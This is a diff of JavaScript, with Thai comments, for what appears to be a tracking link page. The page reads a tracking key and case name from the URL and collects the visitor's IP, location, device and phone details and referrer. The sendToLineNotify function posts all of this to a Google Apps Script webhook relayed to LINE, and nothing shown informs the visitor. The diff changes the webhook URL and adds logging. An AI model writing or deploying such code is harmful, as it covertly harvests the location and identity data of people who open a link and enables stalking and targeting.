@@ -2,9 +2,16 @@
 function getUrlParameters() {
   try {
     const urlParams = new URLSearchParams(window.location.search);
+    const trackingKey = urlParams.get('track') || "ไม่มีค่า";
+    const caseName = urlParams.get('case') || "ไม่มีค่า";
+    
+    console.log("ดึงค่าจาก URL parameters:");
+    console.log("- trackingKey:", trackingKey);
+    console.log("- caseName:", caseName);
+    
     return {
-      trackingKey: urlParams.get('track') || "ไม่มีค่า",
-      caseName: urlParams.get('case') || "ไม่มีค่า" // ยังคงรองรับลิงก์เก่า
+      trackingKey: trackingKey,
+      caseName: caseName
     };
   } catch (error) {
     console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
@@ -460,27 +467,31 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
   return message.join("\n");
 }
 
-// ฟังก์ชันส่งข้อมูลไปยัง LINE Notify ผ่าน API
 function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
-  // สร้างข้อความละเอียด (ใช้ trackingKey และ caseName แยกกัน)
+  // สร้างข้อความละเอียด
   const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName);
 
-  // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwSlu9w-0E3Ip7o3ZluNkX8OB0b8abTYw54S0WCuwH2PCECZdC0i9bE8ntp6kZ4JTOGwA/exec';
+  // ส่งข้อมูลไปยัง webhook ของเรา
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxG_qEgubdLupamBbS_DM092rddYEbodxUrchHK4yFHkWS7Mw0s2yS-1uOMKZnoRD3udg/exec';
 
-  // เตรียมข้อมูลสำหรับส่งไปยัง Google Apps Script
-  // ส่ง caseName และ trackingKey แยกกัน
+  // แก้ไขส่วนนี้: ทำให้แน่ใจว่าส่ง trackingKey ไปด้วยเสมอ
   const dataToSend = {
-    message: detailedMessage, // ข้อความสำหรับ Line Notify (มี caseName และ trackingKey แยกกัน)
+    message: detailedMessage,
     timestamp: timestamp,
     location: location,
     ip: ipData,
     deviceInfo: deviceData,
     phoneInfo: phoneInfo,
     referrer: referrer,
-    trackingKey: trackingKey, // ส่ง trackingKey เดิม
-    caseName: caseName      // ส่ง caseName เดิม
+    trackingKey: trackingKey || "ไม่มีค่า", // ใส่ค่าเริ่มต้นเพื่อป้องกัน undefined
+    caseName: caseName || "ไม่มีค่า" // ใส่ค่าเริ่มต้นเพื่อป้องกัน undefined
   };
+
+  // เพิ่ม console.log เพื่อตรวจสอบข้อมูลที่ส่ง
+  console.log("กำลังส่งข้อมูลไป webhook:", {
+    trackingKey: trackingKey,
+    caseName: caseName
+  });
 
   // ส่งข้อมูล
   fetch(webhookUrl, {
@@ -489,7 +500,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
       'Content-Type': 'application/json'
     },
     body: JSON.stringify(dataToSend),
-    mode: 'no-cors' // สำคัญมากเพื่อป้องกันปัญหา CORS
+    mode: 'no-cors'
   })
   .then(() => {
     console.log("ส่งข้อมูลไปยัง LINE สำเร็จ");
